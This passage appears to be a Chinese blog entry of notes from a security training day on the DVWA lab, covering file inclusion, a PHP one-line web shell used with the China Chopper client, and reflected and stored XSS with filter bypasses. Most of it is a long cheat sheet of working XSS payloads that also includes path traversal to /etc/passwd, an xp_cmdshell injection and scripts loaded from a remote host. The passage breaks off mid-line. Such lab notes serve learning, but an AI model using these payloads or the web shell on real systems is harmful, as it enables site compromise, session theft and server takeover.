        <tag>kali</tag>
      </tags>
  </entry>
  <entry>
    <title>【网络安全1x03】安恒厂家网络安全培训 --- day3</title>
    <url>/1073/</url>
    <content><![CDATA[<p>上午讲dvwa的文件包含漏洞模块，php一句话木马和菜刀工具的使用。</p>
<p>下午讲跨站注入XSS，文件上传漏洞靶机upload-labs。</p>
<span id="more"></span>

<h1 id="dvwa—File-Inclusion"><a href="#dvwa—File-Inclusion" class="headerlink" title="dvwa—File Inclusion"></a>dvwa—File Inclusion</h1><h2 id="手工修改路径"><a href="#手工修改路径" class="headerlink" title="手工修改路径"></a>手工修改路径</h2><p>修改文件路径，查看报错信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=file1.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#修改?page=后文件目录为一个不存在文件</span></span><br><span class="line">http://localhost/dvwa/vulnerabilities/fi/?page=abc.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#回显如下：</span></span><br><span class="line">Warning: include(abc.txt): failed to open stream: No such file or directory <span class="keyword">in</span> C:\Study\CTF\tools\phpstudy_pro\WWW\dvwa\vulnerabilities\<span class="keyword">fi</span>\index.php on line 36</span><br><span class="line"></span><br><span class="line">Warning: include(): Failed opening <span class="string">&#x27;abc.txt&#x27;</span> <span class="keyword">for</span> inclusion (include_path=<span class="string">&#x27;.;C:\php\pear;../../external/phpids/0.6/lib/&#x27;</span>) <span class="keyword">in</span> C:\Study\CTF\tools\phpstudy_pro\WWW\dvwa\vulnerabilities\<span class="keyword">fi</span>\index.php on line 36</span><br></pre></td></tr></table></figure>

<p>得到一个路径<code>C:\php\pear;../../external/phpids/0.6/lib/</code></p>
<h2 id="上传php脚本"><a href="#上传php脚本" class="headerlink" title="上传php脚本"></a>上传php脚本</h2><ol>
<li>显示php信息：</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#回显内容显示上传路径</span></span><br><span class="line"><span class="comment">#../../hackable/uploads/phpinfo.php succesfully uploaded!</span></span><br><span class="line"><span class="comment">#执行phpinfo()显示当前php版本信息</span></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>一句话php木马</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#&lt;?php @eval($_POST[pp]);?&gt;</span></span><br><span class="line"><span class="comment">#执行后打开中国菜刀，新建连接，复制url，后面跟上pp，双击访问得到文件目录</span></span><br><span class="line"><span class="comment">#报200是cookie问题，使用菜刀内置浏览器登录一遍dvwa即可</span></span><br><span class="line"><span class="comment">#报500是php版本问题，降到5.2/5.4即可</span></span><br></pre></td></tr></table></figure>

<h1 id="跨站注入XSS"><a href="#跨站注入XSS" class="headerlink" title="跨站注入XSS"></a>跨站注入XSS</h1><p>网站某些留言框、搜索栏对输入内容进行回显，可能存在跨站攻击。</p>
<p>XSS有三种类型。</p>
<h2 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h2><p>没讲</p>
<h2 id="Reflected型"><a href="#Reflected型" class="headerlink" title="Reflected型"></a>Reflected型</h2><h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>网站源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>由于没有对输入内容进行限制，可以输入下面脚本进行测试：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>回显一个弹出框，内容是<code>/xss/</code>。</p>
<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>切换到medium难度，查看网站源码对<code>&lt;script&gt;</code>字段进行过滤：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">str_replace</span>( <span class="string">&#x27;&lt;script&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>这个可以对<code>&lt;script&gt;</code>进行双写&#x2F;大小写绕过：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&lt;sc<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">ript&gt;<span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>回显一个弹出框，内容是<code>/xss/</code>。</p>
<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>high级别对任何包含<code>script</code>的非连续字符串进行过滤，这个命令基本被完全限制了：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span> (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="title function_ invoke__">array_key_exists</span>( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$name</span> = <span class="title function_ invoke__">preg_replace</span>( <span class="string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for end user</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>使用另一个命令绕过检测：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;1&#x27;</span> <span class="attr">onerror</span>=<span class="string">alert(/xss/)</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>回显一个弹出框，内容是<code>/xss/</code>。</p>
<h2 id="Stored型"><a href="#Stored型" class="headerlink" title="Stored型"></a>Stored型</h2><p>存储型将内容存到数据库，每次刷新页面都会再回显一次。</p>
<p>使用命令与反射型相同。</p>
<p>高级情况下对第二个字段的<code>&lt;&gt;</code>全部过滤，需要抓包修改第一个字段为XSS代码。</p>
<h2 id="常用XSS代码"><a href="#常用XSS代码" class="headerlink" title="常用XSS代码"></a>常用XSS代码</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">1&#x27;&quot;()&amp;%<span class="tag">&lt;<span class="name">acx</span>&gt;</span><span class="tag">&lt;<span class="name">ScRiPt</span> &gt;</span>prompt(915149)<span class="tag">&lt;/<span class="name">ScRiPt</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;svg/onload=alert(1)&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">=&#x27;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(vulnerable)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(&#x27;XSS&#x27;)%3C/script%3E</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">%0a%0a<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(\&quot;Vulnerable\&quot;)<span class="tag">&lt;/<span class="name">script</span>&gt;</span>.jsp</span><br><span class="line"></span><br><span class="line">%22%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd</span><br><span class="line"></span><br><span class="line">%2E%2E/%2E%2E/%2E%2E/%2E%2E/%2E%2E/windows/win.ini</span><br><span class="line"></span><br><span class="line">%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e</span><br><span class="line"></span><br><span class="line">%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">a.jsp/<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">a?<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;Vulnerable&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&#x27;;exec%20master..xp_cmdshell%20&#x27;dir%20 c:%20&gt;%20c:\inetpub\wwwroot\?.txt&#x27;--&amp;&amp;</span><br><span class="line"></span><br><span class="line">%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E</span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(document. domain);%3C/script%3E&amp;</span><br><span class="line"></span><br><span class="line">%3Cscript%3Ealert(document.domain);%3C/script%3E&amp;SESSION_ID=&#123;SESSION_ID&#125;&amp;SESSION_ID=</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">JaVaScRiPt:alert(</span>&quot;<span class="attr">XSS</span>&quot;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;jav ascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;<span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">java\0script:alert(\</span>&quot;<span class="attr">XSS</span>\&quot;)&gt;</span>&quot;;&#x27; &gt; out</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot; javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript">a=<span class="regexp">/XSS/</span><span class="title function_">alert</span>(a.<span class="property">source</span>)</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span> <span class="attr">ONLOAD</span>=<span class="string">alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">DYNSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">LOWSRC</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BGSOUND</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span> <span class="attr">size</span>=<span class="string">&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LAYER</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">layer</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LINK</span> <span class="attr">REL</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&#x27;vbscript:msgbox(&quot;XSS&quot;)&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;mocha:[code]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;livescript:[code]&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">META</span> <span class="attr">HTTP-EQUIV</span>=<span class="string">&quot;refresh&quot;</span> <span class="attr">CONTENT</span>=<span class="string">&quot;0;url=javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">IFRAME</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">FRAMESET</span>&gt;</span><span class="tag">&lt;<span class="name">FRAME</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">XSS</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">FRAME</span>&gt;</span><span class="tag">&lt;/<span class="name">FRAMESET</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">TABLE</span> <span class="attr">BACKGROUND</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;background-image: url(javascript:alert(&#x27;XSS&#x27;))&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">DIV</span> <span class="attr">STYLE</span>=<span class="string">&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span>&gt;</span>@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">STYLE</span>=<span class="string">&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span>alert(&#x27;XSS&#x27;);<span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">TYPE</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-class">.XSS</span>&#123;<span class="attribute">background-image</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>);&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span><span class="tag">&lt;<span class="name">A</span> <span class="attr">class</span>=<span class="string">&quot;XSS&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">STYLE</span> <span class="attr">type</span>=<span class="string">&quot;text/css&quot;</span>&gt;</span><span class="language-css"><span class="selector-tag">BODY</span>&#123;<span class="attribute">background</span>:<span class="built_in">url</span>(<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span>)&#125;</span><span class="tag">&lt;/<span class="name">STYLE</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">BASE</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);//&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">getURL(&quot;javascript:alert(&#x27;XSS&#x27;)&quot;)</span><br><span class="line"></span><br><span class="line">a=&quot;get&quot;;b=&quot;URL&quot;;c=&quot;javascript:&quot;;d=&quot;alert(&#x27;XSS&#x27;);&quot;;eval(a+b+c+d);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">XML</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;);&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">&quot;&gt; <span class="tag">&lt;<span class="name">BODY</span>&gt;</span><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">a</span>(<span class="params"></span>)&#123;<span class="title function_">alert</span>(<span class="string">&#x27;XSS&#x27;</span>);&#125;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>&lt;&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/xss.jpg&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(&#x27;XSS&#x27;)&quot;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&lt;!<span class="attr">--</span>#<span class="attr">exec</span> <span class="attr">cmd</span>=<span class="string">&quot;/bin/echo &#x27;&lt;SCRIPT SRC&#x27;&quot;</span><span class="attr">--</span>&gt;</span><span class="comment">&lt;!--#exec cmd=&quot;/bin/echo</span></span><br><span class="line"><span class="comment">&#x27;=http://xss.ha.ckers.org/a.js&gt;&lt;/SCRIPT&gt;&#x27;&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">src</span>=<span class="string">&quot;http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> =<span class="string">&quot;&gt;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">a</span>=<span class="string">&quot;&gt;&quot;</span> &#x27;&#x27; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> &quot;<span class="attr">a</span>=<span class="string">&#x27;&gt;&#x27;</span>&quot; <span class="attr">src</span>=<span class="string">&quot;http://xss.ha.ckers.org/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;SCRI&quot;</span>);</span><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span>PT src=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">A</span> <span class="attr">href</span>=<span class="string">http://www.gohttp://www.google.com/ogle.com/</span>&gt;</span>link<span class="tag">&lt;/<span class="name">A</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">javascript:alert(‘XSS’)</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">#</span> <span class="attr">onmouseover</span>=<span class="string">”alert(‘xxs’)”</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">/</span> <span class="attr">onerror</span>=<span class="string">”alert(String.fromCharCode(88,83,83))”</span>&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">”&amp;#0000106&amp;#0000097&amp;#0000118&amp;#0000097&amp;#0000115&amp;#0000099&amp;#0000114&amp;#0000105&amp;#0000112&amp;#0000116&amp;#0000058&amp;#0000097&amp;#0000108&amp;#0000101&amp;#0000114&amp;#0000116&amp;#0000040&amp;#0000039&amp;#0000088&amp;#0000083&amp;#0000083&amp;#0000039&amp;#0000041″</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;</span></span></span><br><span class="line"><span class="tag"></span></span><br><span class="line"><span class="tag">&amp;#<span class="attr">39</span>;&amp;#<span class="attr">88</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">83</span>;&amp;#<span class="attr">39</span>;&amp;#<span class="attr">41</span>;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav</span> <span class="attr">ascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”jav&amp;#x0A;ascript:alert(‘XSS’);”</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">IMG</span> <span class="attr">SRC</span>=<span class="string">”</span> &amp;#<span class="attr">14</span>;  <span class="attr">javascript:alert</span>(‘<span class="attr">XSS</span>’);”&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;<span class="tag">&lt;<span 